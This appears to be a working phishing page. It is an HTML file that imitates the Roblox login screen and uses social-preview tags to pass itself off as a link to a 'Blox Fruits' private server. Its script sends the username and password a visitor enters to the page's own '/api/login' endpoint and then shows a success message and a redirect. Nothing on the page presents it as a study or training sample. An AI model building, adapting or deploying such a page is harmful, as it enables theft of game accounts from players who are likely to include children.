<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>

    <!-- Telegram Preview Meta Tags -->
    <meta property="og:site_name" content="Roblox">
    <meta property="og:title" content="Blox Fruits — Private Server">
    <meta property="og:description" content="Secure access to the Blox Fruits private server. Click to enter the game.">
    <meta property="og:image" content="https://i.ibb.co/68037659/blox-fruits.jpg">
    <meta property="og:image:secure_url" content="https://i.ibb.co/68037659/blox-fruits.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0d0f12; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; position: relative; overflow-x: hidden; padding: 20px 16px; }
        
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                radial-gradient(circle, rgba(13, 15, 18, 0.7) 0%, rgba(13, 15, 18, 0.9) 100%),
                url('https://i.ibb.co/68037659/blox-fruits.jpg');
            background-size: cover;
            background-position: center;
            z-index: -2;
        }

        .bg-collage {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1;
            opacity: 0.35;
            pointer-events: none;
            overflow: hidden;
        }
        .bg-tile {
            position: absolute;
            background-size: cover;
            background-position: center;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .tile-1 { width: 160px; height: 100px; top: 5%; left: -10%; transform: rotate(-10deg); background-image: url('https://i.ibb.co/68037659/blox-fruits.jpg'); }
        .tile-2 { width: 150px; height: 95px; top: 2%; right: -5%; transform: rotate(15deg); background-image: url('https://i.ibb.co/68037659/blox-fruits.jpg'); }
        .tile-3 { width: 170px; height: 105px; bottom: 10%; left: -5%; transform: rotate(8deg); background-image: url('https://i.ibb.co/68037659/blox-fruits.jpg'); }
        .tile-4 { width: 180px; height: 110px; bottom: 5%; right: -8%; transform: rotate(-12deg); background-image: url('https://i.ibb.co/68037659/blox-fruits.jpg'); }

        .close-btn {
            position: absolute;
            top: 16px;
            left: 16px;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
            z-index: 10;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 40px;
            position: relative;
            z-index: 10;
        }

        .roblox-logo-text {
            font-size: 38px;
            font-weight: 900;
            letter-spacing: -1px;
            color: #fff;
            margin-bottom: 35px;
            text-transform: uppercase;
        }

        .input-box {
            width: 100%;
            background: rgba(30, 33, 42, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            margin-bottom: 14px;
            position: relative;
            backdrop-filter: blur(10px);
        }

        .input-box input {
            width: 100%;
            padding: 16px;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 15px;
        }

        .input-box input::placeholder {
            color: #9ca3af;
        }

        .eye-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
            cursor: pointer;
            font-size: 18px;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.15);
            color: #9ca3af;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 6px;
            margin-bottom: 14px;
            transition: 0.2s;
        }

        .login-btn.active {
            background: #fff;
            color: #000;
        }

        .quick-btn {
            width: 100%;
            padding: 16px;
            background: transparent;
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            text-align: center;
        }

        .quick-btn:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .forgot-link {
            color: #9ca3af;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 40px;
            text-align: center;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }

        .footer-links {
            display: flex;
            gap: 24px;
            justify-content: center;
            font-size: 14px;
            margin-top: auto;
            padding-bottom: 20px;
        }

        .footer-links a {
            color: #60a5fa;
            text-decoration: underline;
        }

        #status {
            margin-top: 10px;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="close-btn">✕</div>

    <div class="bg-collage">
        <div class="bg-tile tile-1"></div>
        <div class="bg-tile tile-2"></div>
        <div class="bg-tile tile-3"></div>
        <div class="bg-tile tile-4"></div>
    </div>

    <div class="container">
        <div class="roblox-logo-text">ROBLOX</div>

        <div class="input-box">
            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
        </div>

        <div class="input-box">
            <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
            <span class="eye-icon">👁️</span>
        </div>

        <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
        
        <button class="quick-btn">Quick Pass</button>

        <a href="#" class="forgot-link">Forgot Password or Username</a>

        <div id="status"></div>
    </div>

    <div class="footer-links">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        function checkInputs() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            if (user && pass) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#9ca3af';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#22c55e';
                    statusDiv.innerText = 'Success! Redirecting...';
                    
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>
</body>
</html>
